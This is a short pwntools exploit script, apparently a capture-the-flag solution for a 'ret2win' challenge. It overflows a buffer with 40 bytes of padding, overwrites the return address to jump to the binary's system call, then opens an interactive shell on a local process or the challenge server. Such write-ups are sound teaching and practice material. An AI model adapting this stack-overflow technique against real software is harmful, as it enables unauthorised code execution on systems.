#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./ret2win')
context.log_level = "error"

if args.REMOTE:
    p = remote('ret2win.challenges.ctf.ritsec.club', 1337)
else:
    p = process(binary.path)

# gdb.attach(p)

payload  = b""
payload += b"A"*40
payload += p64(0x00000000004011c6) # Jump to system part
payload += b"\n"

p.sendline(payload)
p.stream()
p.interactive()